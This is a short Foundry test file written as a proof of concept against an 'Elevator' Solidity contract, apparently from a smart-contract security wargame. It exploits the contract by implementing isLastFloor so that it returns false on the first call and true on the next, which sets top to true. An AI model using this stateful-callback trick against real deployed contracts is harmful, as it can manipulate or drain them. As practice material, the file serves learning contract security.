// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;
import {Test, console} from "forge-std/Test.sol";
import {Elevator} from "../src/Elevator.sol";

contract Elevator_POC is Test {
    Elevator _elevator;
    bool first = true;
    function init() private{
        vm.startPrank(address(0x10));
        _elevator = new Elevator();
        vm.stopPrank();
    }
    function setUp() public {
        init();
    }

    function test_Elevator_POC() public{
        _elevator.goTo(6);
        console.log("Success:",_elevator.top());
    }

    function isLastFloor(uint256) external returns (bool){
        if(first){
            first = false;
            return false;
        }
        return true;
    }
}

